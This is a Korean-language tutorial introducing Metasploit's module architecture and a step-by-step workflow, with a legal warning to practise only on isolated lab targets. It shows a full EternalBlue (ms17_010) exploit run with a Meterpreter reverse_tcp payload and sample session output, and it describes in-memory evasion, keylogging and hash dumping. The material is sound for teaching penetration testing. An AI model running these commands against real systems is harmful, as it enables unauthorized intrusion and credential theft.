아키텍처 개요 (Architecture Overview)

Metasploit(메타스플로잇)은 전 세계적으로 가장 많이 사용되는 Penetration Testing(페너트레이션 테스팅, 침투 테스트 및 모의 해킹) 플랫폼입니다. 대상 시스템의 취약점을 탐지하고, 실제 공격 코드를 실행하여 보안 상태를 점검하는 데 최적화되어 있습니다. 무료 오픈소스 버전과 상용 프로 버전이 존재하며, 실무 보안 점검의 표준 도구로 자리매김하고 있습니다.

[도식: 침투 테스트 공격 흐름도]

공격자 (Attacker)
MSF Console / Kali Linux
Exploit & Payload
대상 서버 (Target)
Vulnerable System

주요 모듈 구성 (Core Modules)

Metasploit은 기능별로 모듈화(Modularized)되어 있어 높은 확장성을 제공합니다. 각 모듈의 역할은 다음과 같습니다.

ATTACK

Exploit

(익스플로잇, 취약점 공격 코드)
대상 시스템의 약점(Bug)이나 설계 결함을 이용하여 침투하는 실제 공격 코드입니다.

EXECUTE

Payload

(페이로드, 공격 수행 코드)
침투 성공 후, 대상 시스템에서 실행할 동작(예: 리버스 쉘 연결, 백도어 설치 등)을 정의합니다.

SCAN

Auxiliary

(옥질리어리, 보조 도구)
스캐닝(Scanning), 스니핑(Sniffing), 서비스 거부 공격(DoS) 등 공격 전 단계의 정보 수집과 보조 작업을 돕습니다.

CONTROL

Post

(포스트, 침투 후 작업)
침투 성공 이후 시스템 내부 정보 수집, 권한 상승(Privilege Escalation), 흔적 제거 등을 수행하는 모듈입니다.

EVADE

Encoder

(인코더, 암호화/난독화 도구)
백신(Anti-Virus)이나 IDS/IPS의 탐지를 피하기 위해 페이로드의 시그니처를 변조하고 암호화합니다.

* IDS/IPS (Intrusion Detection/Prevention System, 침입 탐지/방지 시스템): 네트워크나 시스템의 비정상적인 활동을 모니터링하고 차단하는 보안 솔루션입니다.
* DoS (Denial of Service, 서비스 거부 공격): 시스템 리소스를 고갈시켜 정상적인 서비스를 방해하는 공격입니다.

기본 사용 흐름 (Step-by-Step Implementation)

모의 해킹의 표준 절차인 정보 수집 → 취약점 분석 → 침투 → 결과 보고 과정을 MSF 내부 명령어로 구현하는 방법입니다.

01

서비스 실행 및 접속

터미널에서 메타스플로잇 콘솔(msfconsole)을 실행합니다. 네트워크 소켓을 열거나 시스템 리소스에 접근하기 위해 일반적으로 관리자 권한(root)이 필요합니다.

kali@attacker:~$ sudo msfconsole

=[ metasploit v6.3.0-dev ]
+ -- --=[ 2301 exploits - 1200 auxiliary - 400 post ]
msf6 >
02

모듈 검색 및 선택

공격하려는 서비스나 취약점(예: SMB 프로토콜, Log4j 등)을 search 명령어로 검색하고, use 명령어로 사용할 모듈을 로드합니다.

msf6 > search ms17_010
Matching Modules
================
...
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
03

옵션 설정 (Payload 및 IP/Port)

show options를 통해 필수 설정값을 확인합니다. RHOSTS (Remote Hosts, 공격 대상 IP)와 LHOST (Local Host, 공격자 IP)를 설정하고 적절한 페이로드를 지정합니다.

msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS 192.168.1.100 # 대상 IP 설정
msf6 exploit(...) > set LHOST 192.168.1.50 # 내 IP 설정
msf6 exploit(...) > show payloads
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
04

공격 실행 (Exploitation)

모든 준비가 완료되면 exploit 또는 run 명령어를 입력하여 공격을 수행합니다. 성공 시 대상 서버의 제어권을 획득하게 됩니다.

msf6 exploit(...) > exploit
[*] Started reverse TCP handler on 192.168.1.50:4444
[*] Sending all but last fragment of exploit packet
[*] Sending the last fragment of exploit packet!
[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:49158)
meterpreter >

아키텍트 인사이트 (Expert Insight)

실무 활용 팁: Meterpreter 및 DB 연동

Meterpreter(미터프리터)는 MSF에서 제공하는 매우 강력한 전용 고급 페이로드입니다. 하드디스크에 파일을 남기지 않고 메모리 상에서만 동작(In-Memory)하여 포렌식 추적을 회피할 수 있으며, 키로깅, 웹캠 제어, 해시 덤프 등 대상 시스템을 강력하게 제어하는 대화형 쉘을 제공합니다.

또한, 실무에서는 터미널 외부에서 msfdb init 명령어를 통해 PostgreSQL 데이터베이스와 연동하는 것이 필수입니다. 이를 통해 Nmap 스캔 결과와 획득한 자격 증명(Credentials)을 워크스페이스(Workspace)별로 체계적으로 관리하고 보고서 작성을 자동화할 수 있습니다.

법적 고지 및 주의사항

Metasploit은 실제 해킹 공격 도구입니다. 명시적으로 허가받지 않은 타인의 시스템이나 퍼블릭 클라우드 인스턴스를 대상으로 테스트를 진행할 경우, 정보통신망법(정보통신망 이용촉진 및 정보보호 등에 관한 법률)에 의해 무거운 형사 처벌을 받을 수 있습니다.

침투 테스트 실습은 반드시 격리된 사설망 내의 가상 환경(VirtualBox, VMware 등)에 구축된 실습용 타겟(예: Metasploitable2, DVWA)을 대상으로만 수행해야 합니다.

* PostgreSQL (포스트그레스큐엘): 확장성과 표준 준수를 강조하는 강력한 오픈 소스 객체-관계형 데이터베이스 시스템(ORDBMS)입니다. MSF의 백엔드 DB로 사용됩니다.
* In-Memory Execution (인메모리 실행): 디스크에 파일을 쓰지 않고 RAM 메모리 공간 내에서만 프로그램 코드를 실행하여 보안 소프트웨어의 파일 기반 탐지를 우회하는 기술입니다.
